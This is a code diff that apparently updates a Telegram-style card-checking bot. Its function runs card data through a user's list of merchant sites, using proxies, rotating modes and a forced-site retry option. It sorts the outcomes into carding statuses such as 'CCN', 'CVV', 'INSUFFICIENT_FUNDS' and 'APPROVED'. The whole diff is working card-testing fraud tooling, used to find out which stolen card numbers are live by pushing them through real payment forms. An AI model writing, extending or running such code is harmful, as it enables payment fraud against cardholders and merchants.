         "CVV": ("CVV ⚠️", "CVV", "Your card does not support this type of purchase.", "⚠️"),
@@ -1100,21 +1432,31 @@ def normalize_result(status_raw: str, err_msg: str = ""):
 # ==========================================================
 # PROCESS CARD FOR USER SITES (Auto-default site if missing)
 # ==========================================================
-def process_card_for_user_sites(ccx, chat_id, proxy=None, worker_id=None):
+def process_card_for_user_sites(ccx, chat_id, proxy=None, worker_id=None, preferred_site=None, stop_checker=None):
     from mass_check import is_stop_requested
 
     # 🛑 Stop check before anything starts
-    if is_stop_requested(str(chat_id)):
+    chat_id = str(chat_id)
+
+    def _should_stop() -> bool:
+        if stop_checker:
+            try:
+                if stop_checker():
+                    return True
+            except Exception:
+                pass
+        return is_stop_requested(chat_id)
+
+    if _should_stop():
         print(f"[PROCESS STOP] User {chat_id} requested stop before processing card.")
         return None, {"status": "STOPPED", "reason": "User requested stop"}
 
     state = _load_state(chat_id)
-    chat_id = str(chat_id)
     user_sites = list(state.get(chat_id, {}).get("sites", {}).keys())
 
     # ✅ AUTO-ADD default site for new users (no sites.json entry)
     if not user_sites:
-        if is_stop_requested(str(chat_id)):
+        if _should_stop():
             print(f"[PROCESS STOP] User {chat_id} stopped before auto-site setup.")
             return None, {"status": "STOPPED", "reason": "User requested stop"}
 
@@ -1142,10 +1484,27 @@ def process_card_for_user_sites(ccx, chat_id, proxy=None, worker_id=None):
     mode = state[chat_id]["sites"][first_site].get("mode", "all").lower()
 
     # =======================================================
+    # FORCE SPECIFIC SITE (for retry confirmations)
+    # =======================================================
+    if preferred_site:
+        target_site = preferred_site
+        if _should_stop():
+            print(f"[PROCESS STOP] User {chat_id} stopped before forced site processing.")
+            return None, {"status": "STOPPED", "reason": "User requested stop"}
+
+        manager = SiteAuthManager(target_site, chat_id, proxy, worker_id=worker_id)
+        result = manager.process_card(ccx)
+
+        if isinstance(result, dict):
+            result["_used_proxy"] = getattr(manager, "_used_proxy", False)
+
+        return manager.site_url, result
+
+    # =======================================================
     # MODE: ROTATE  (random + round robin)
     # =======================================================
     if mode == "rotate":
-        if is_stop_requested(str(chat_id)):
+        if _should_stop():
             print(f"[PROCESS STOP] User {chat_id} stopped before rotate mode processing.")
             return None, {"status": "STOPPED", "reason": "User requested stop"}
 
@@ -1168,20 +1527,20 @@ def process_card_for_user_sites(ccx, chat_id, proxy=None, worker_id=None):
     # MODE: ALL
     # =======================================================
     elif mode == "all":
-        if is_stop_requested(str(chat_id)):
+        if _should_stop():
             print(f"[PROCESS STOP] User {chat_id} stopped before all-sites loop.")
             return None, {"status": "STOPPED", "reason": "User requested stop"}
 
         result = None
         for site_url in user_sites:
-            if is_stop_requested(str(chat_id)):
+            if _should_stop():
                 print(f"[PROCESS STOP] User {chat_id} stopped mid-loop (site={site_url}).")
                 return None, {"status": "STOPPED", "reason": "User requested stop"}
 
             manager = SiteAuthManager(site_url, chat_id, proxy, worker_id=worker_id)
             result = manager.process_card(ccx)
 
-            if is_stop_requested(str(chat_id)):
+            if _should_stop():
                 print(f"[PROCESS STOP] User {chat_id} stopped after processing site {site_url}.")
                 return None, {"status": "STOPPED", "reason": "User requested stop"}
 
@@ -1189,7 +1548,7 @@ def process_card_for_user_sites(ccx, chat_id, proxy=None, worker_id=None):
                 status = result.get("status", "").upper()
                 if status in [
                     "CARD ADDED", "PAYMENT_ADDED", "CCN", "INSUFFICIENT_FUNDS",
-                    "CVV", "3DS_REQUIRED", "DOES_NOT_SUPPORT", "UNSUPPORTED_GATEWAY"
+                    "APPROVED", "CVV", "3DS_REQUIRED", "DOES_NOT_SUPPORT", "UNSUPPORTED_GATEWAY"
                 ]:
                     return site_url, result
 
@@ -1200,7 +1559,7 @@ def process_card_for_user_sites(ccx, chat_id, proxy=None, worker_id=None):
     # Fallback
     # =======================================================
     else:
-        if is_stop_requested(str(chat_id)):
+        if _should_stop():
             print(f"[PROCESS STOP] User {chat_id} stopped before fallback mode.")
             return None, {"status": "STOPPED", "reason": "User requested stop"}
 
@@ -1209,7 +1568,7 @@ def process_card_for_user_sites(ccx, chat_id, proxy=None, worker_id=None):
         manager = SiteAuthManager(site_url, chat_id, proxy, worker_id=worker_id)
         result = manager.process_card(ccx)
 
-        if is_stop_requested(str(chat_id)):
+        if _should_stop():
             print(f"[PROCESS STOP] User {chat_id} stopped before returning fallback result.")
             return None, {"status": "STOPPED", "reason": "User requested stop"}
 
@@ -1284,6 +1643,7 @@ def reset_user_sites(chat_id):
 
     except Exception as e:
         print(f"[SITE RESET ERROR] Could not recreate site JSON for {chat_id}: {e}")
+
 
 
 
